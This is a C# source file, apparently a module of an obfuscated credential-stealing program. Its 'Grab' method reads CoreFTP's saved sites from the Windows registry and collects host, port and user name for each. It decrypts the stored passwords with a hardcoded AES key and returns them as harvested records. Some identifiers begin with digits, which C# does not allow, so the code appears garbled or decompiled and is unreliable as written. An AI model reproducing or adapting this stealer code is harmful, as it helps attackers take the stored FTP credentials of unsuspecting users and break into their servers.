using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using JSW1fecBOy;
using Microsoft.Win32;

namespace rk937aHHc
{
	public class CoreFTP : EtbH
	{
		public CoreFTP()
		{
			this.JjqJK0wP = "CoreFTP";
		}
		public string JjqJK0wP { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();
			string registryPath = @"SOFTWARE\FTPWare\COREFTP\Sites";

			using (RegistryKey sitesKey = Registry.CurrentUser.OpenSubKey(registryPath))
			{
				if (sitesKey == null)
					return list;

				string[] subKeyNames = sitesKey.GetSubKeyNames();

				foreach (string subKeyName in subKeyNames)
				{
					try
					{
						using (RegistryKey siteKey = Registry.CurrentUser.OpenSubKey(registryPath + "\\" + subKeyName))
						{
							if (siteKey == null)
								continue;

							string host = (string)siteKey.GetValue("Host");
							string port = (string)siteKey.GetValue("Port");
							string user = (string)siteKey.GetValue("User");
							string passwordEncrypted = (string)siteKey.GetValue("PW");

							byte[] passwordBytes = g3Vt7T2gk5.83xr(passwordEncrypted);

							list.Add(new WTitxI2m
							{
								data4 = this.JjqJK0wP,
								data2 = user,
								data1 = host + port,
								data3 = this.8LzJ(passwordBytes)
							});
						}
					}
					catch
					{
					}
				}
			}

			return list;
		}
		private string 8LzJ(byte[] encryptedBytes)
		{
			byte[] key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk");

			using (RijndaelManaged rijndael = new RijndaelManaged())
			{
				try
				{
					rijndael.Mode = CipherMode.ECB;
					rijndael.Key = key;
					rijndael.Padding = PaddingMode.Zeros;
					rijndael.BlockSize = 128;
					rijndael.IV = new byte[16]; 

					byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
					return Encoding.UTF8.GetString(decryptedBytes);
				}
				catch (Exception ex)
				{
					throw new Exception(ex.ToString());
				}
			}
		}
	}
}
